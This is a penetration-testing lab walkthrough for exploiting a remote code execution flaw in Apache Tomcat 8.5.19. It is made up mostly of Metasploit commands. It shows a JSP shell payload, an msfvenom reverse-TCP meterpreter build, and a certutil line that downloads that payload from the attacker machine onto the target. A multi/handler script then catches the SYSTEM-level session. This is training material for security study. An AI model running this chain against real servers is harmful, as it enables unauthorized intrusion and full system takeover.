# Exploiting Apache Tomcat

+ Apache Tomcat, also known as Tomcat server, is a popular, free and open source Java servlet web server.

+ It is used to build and host dynamic websites and web applications based on the Java software platform.

+ Apache Tomcat utilizes the HTTP protocol to facilitate the underlying communication between the server and clients.

+ Apache Tomcat runs on TCP port 8080 by default.

+ The standard Apache HTTP web server is used to host static and dynamic websites or web applications, typically developed in PHP.

+ The Apache Tomcat web server is primarily used to host dynamic websites or web applications developed in Java.

+ Apache Tomcat V8.5.19 is vulnerable to a remote code execution vulnerability that could potentially allow an attacker to upload and execute a JSP payload in order to gain remote access to the target server.

+ We can utilize a prebuilt MSF exploit module to exploit this vulnerability and consequently gain access to the target server.

## Laboratory

- Start the postgresql server by running `service postgresql start`.

- Start the msfconsole and check the database status.

- Create a new workspace and import your nmap scan results or run the tcp port scan from msfconsole if you want to. We can name it tomcat for this example.

- Set globally the target IP with `setg RHOSTS $TARGET_IP`, do this for the RHOST option as well.

- From the nmap scan, we should see the apache tomcat web server running on port 8080, version 8.5.19, which is vulnerable to a RCE via JSP upload. If we search in the msfconsole by running `search type:exploit tomcat_jsp` we should find the module we want to use for this case. We only need to make sure the rhosts and rport are set correctly. In this example we can only use a jsp payload, which is a java payload. So we are going to set it by running `set payload java/jsp_shell_bind_tcp`, note this is a non-staged payload. And we will also need to set up the shell command we want to execute upon running the payload, in this case we will use cmd.

- After running the exploit module, we should get a cmd session. Put it on background for now. We are now going to try to migrate it to a meterpreter session. For now, we cannot upgrade it using any post-exploitation module as the cmd session is `java/linux` type. To achieve this, we are going to use msfvenom to craft a meterpreter payload and upload it through the command shell by running `msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=1234 -f exe > meterpreter.exe`.

- Once the meterpreter paylaod is created, we are going to serve the file through a simple http server on our kali machine `sudo python -m SimpleHTTPServer 80`, and from this server, we are going to download the payload on the target machine with a built in windows utility.

- We are going to come back to our java session, from it we are going to run `certutil -urlcache -f http://X.X.X.X/meterpreter.exe meterpreter.exe` Note that the ip address we need to use to download the file should be our kali machine url.

- Now we are going to prepare a Resource Script to launch a multihandler. Start a vim editor in your kali machine with a new file called handler.rc and paste in there these contents:

```
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST X.X.X.X
set LPORT 1234
run
```

**Note**: The LHOST option should contain the kali IP address and the LPORT option should contain the port we speicified when creating the payload con msfvenom.

- Run `msfconsole -r handler.rc` to run the handler automatically. Then come back to the cmd session on the target machine and execute the meterpreter.exe payload. We should recieve a connection to the multihandler and a meterpreter session should be established with NT AUTHORITY\SYSTEM privileges.
